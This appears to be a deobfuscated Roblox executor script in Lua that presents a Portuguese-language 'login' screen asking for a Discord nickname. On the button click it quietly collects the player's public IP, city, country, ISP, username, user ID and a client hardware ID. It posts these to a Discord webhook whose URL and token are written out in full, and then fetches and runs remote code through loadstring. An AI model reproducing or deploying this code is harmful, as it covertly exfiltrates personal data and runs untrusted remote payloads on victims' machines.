local fenv = getfenv()
local _call5 = game:GetService('HttpService')

game:GetService('UserInputService')

local _LocalPlayer10 = game:GetService('Players').LocalPlayer
local _call12 = Instance.new('ScreenGui')

_call12.Name = 'auth_syst'
_call12.ResetOnSpawn = false
_call12.Parent = _LocalPlayer10.PlayerGui

local _call15 = Instance.new('Frame')

_call15.Name = 'f_main'
_call15.Size = UDim2.new(0, 320, 0, 220)
_call15.Position = UDim2.new(0.5, -160, 0.5, -110)
_call15.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_call15.BorderSizePixel = 0
_call15.Parent = _call12

local _call23 = Instance.new('UICorner')

_call23.CornerRadius = UDim.new(0, 15)
_call23.Parent = _call15

local _call27 = Instance.new('UIStroke')

_call27.Color = Color3.fromRGB(100, 115, 255)
_call27.Thickness = 2.5
_call27.Parent = _call15

local _call31 = Instance.new('TextLabel')

_call31.Size = UDim2.new(1, 0, 0, 60)
_call31.BackgroundTransparency = 1
_call31.Text = 'Login Requerido'
_call31.TextColor3 = Color3.new(1, 1, 1)
_call31.Font = Enum.Font.GothamBold
_call31.TextSize = 20
_call31.Parent = _call15

local _call39 = Instance.new('TextBox')

_call39.Size = UDim2.new(0.85, 0, 0, 45)
_call39.Position = UDim2.new(0.075, 0, 0.35, 0)
_call39.PlaceholderText = 'Nick do Discord...'
_call39.Text = ''
_call39.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
_call39.TextColor3 = Color3.new(1, 1, 1)
_call39.Font = Enum.Font.Gotham
_call39.TextSize = 14
_call39.Parent = _call15

local _call51 = Instance.new('UICorner')

_call51.CornerRadius = UDim.new(0, 10)
_call51.Parent = _call39

local _call55 = Instance.new('TextButton')

_call55.Size = UDim2.new(0.85, 0, 0, 45)
_call55.Position = UDim2.new(0.075, 0, 0.68, 0)
_call55.Text = 'LOGAR'
_call55.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
_call55.TextColor3 = Color3.new(1, 1, 1)
_call55.Font = Enum.Font.GothamBold
_call55.Parent = _call15

local _call67 = Instance.new('UICorner')

_call67.CornerRadius = UDim.new(0, 10)
_call67.Parent = _call55

local _call71 = game:GetService('RbxAnalyticsService')

_call55.MouseButton1Click:Connect(function(_77, _77_2, _77_3, _77_4)
    local _ = #_call39.Text

    _call55.Text = 'Carregando...'

    local _ = fenv.syn
    local _httprequest83 = http.request
    local _call84 = _httprequest83({
        Method = 'GET',
        Url = 'https://api.ipify.org',
    })
    local _call86 = _httprequest83({
        Method = 'GET',
        Url = 'http://ip-api.com',
    })
    local _call89 = _call5:JSONDecode(_call86.Body)
    local _call99 = game:GetService('MarketplaceService')
    local _109 = math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())

    identifyexecutor()

    local _call126 = _call5:JSONEncode({
        content = '<@&1465485423601127434>',
        embeds = {
            [1] = {
                color = 65280,
                fields = {
                    [1] = {
                        value = _LocalPlayer10.Name .. ' (' .. _LocalPlayer10.UserId .. ')',
                        name = '\u{1f464} Player',
                        inline = true,
                    },
                    [2] = {
                        value = _call39.Text,
                        name = '\u{1f4ac} DC',
                        inline = true,
                    },
                    [3] = {
                        value = 'Passou - HWID n\u{e3}o banido',
                        name = '\u{2705} Ban Check',
                        inline = false,
                    },
                    [4] = {
                        value = 'IP: ' .. tostring(_call84.Body) .. '\nLoc: ' .. tostring(_call89.city .. ', ' .. _call89.country) .. '\nISP: ' .. tostring(_call89.isp),
                        name = '\u{1f310} Rede',
                        inline = false,
                    },
                    [5] = {
                        value = _call99:GetProductInfo(game.PlaceId).Name .. ' | Ping: ' .. _109,
                        name = '\u{1f3ae} Game',
                        inline = false,
                    },
                    [6] = {
                        value = '```' .. _call71:GetClientId() .. '```',
                        name = '\u{1f4bb} HWID',
                        inline = false,
                    },
                },
                title = '\u{1f6a8} PANELA TA ON',
            },
        },
    })

    http.request({
        Body = _call126,
        Url = 'https://webhook.lewisakura.moe/api/webhooks/1524145831043797073/wbll8AjAi9qkjPXVW9rEL4fRjVLZNQoJGVTQqzLZnaOIo9XF2GfAszTz8IVIRgmc9J2i',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json',
        },
    })
    _call15:TweenPosition(UDim2.new(0.5, -160, 1.3, 0), 'In', 'Quart', 0.4)
    task.wait(0.5)
    _call12:Destroy()
    loadstring(game:HttpGet('https://pastefy.app/x9Ze5jat/raw'))()
end)
